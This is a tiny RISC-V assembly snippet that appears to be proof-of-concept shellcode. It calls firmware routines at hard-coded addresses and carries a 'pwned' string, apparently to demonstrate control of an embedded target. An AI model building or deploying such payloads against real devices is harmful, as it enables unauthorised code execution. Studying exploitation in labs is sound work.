func:
        li a2, 0
        li a1, 0
        li a0, 0x80000444
        li a5, 0x20401E08
        jalr ra, a5
        li a1, 0x80003fdc
        li a5, 0x20402c62
        jalr ra, a5
pwstr:
        .ascii "pwned\n"

